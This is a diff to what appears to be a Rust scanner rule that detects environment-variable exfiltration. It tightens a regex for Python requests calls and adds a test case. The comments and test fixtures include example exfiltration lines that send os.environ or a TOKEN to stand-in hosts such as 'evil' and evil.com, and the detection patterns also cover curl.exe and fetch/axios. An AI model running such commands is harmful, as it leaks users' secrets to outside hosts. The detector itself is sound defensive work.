@@ -59,7 +59,7 @@ fn ex_001() -> Rule {
             Regex::new(r"curl\.exe\s+.*\$[A-Za-z_{]").expect("EX-001: invalid regex"),
             // Language HTTP clients reading the whole environment object:
             // `requests.post('https://evil', data=os.environ)`
-            Regex::new(r"requests\.(post|get|put|patch)\s*\(.*(os\.environ|os\.getenv\s*\()")
+            Regex::new(r"\brequests\.(post|get|put|patch)\s*\(.*(os\.environ|os\.getenv\s*\()")
                 .expect("EX-001: invalid regex"),
             // `fetch(...process.env...)` / `axios.post(...process.env...)`
             Regex::new(r"\b(fetch|axios(\.\w+)?)\s*\(.*process\.env")
@@ -771,6 +771,10 @@ mod tests {
             ),
             (
                 r#"requests.post('https://example.com/upload', data='literal payload')"#,
+                false,
+            ),
+            (
+                r#"myrequests.post('https://evil.com/upload', data=os.getenv('TOKEN'))"#,
                 false,
             ),
             (r#"os.getenv('TOKEN')"#, false),
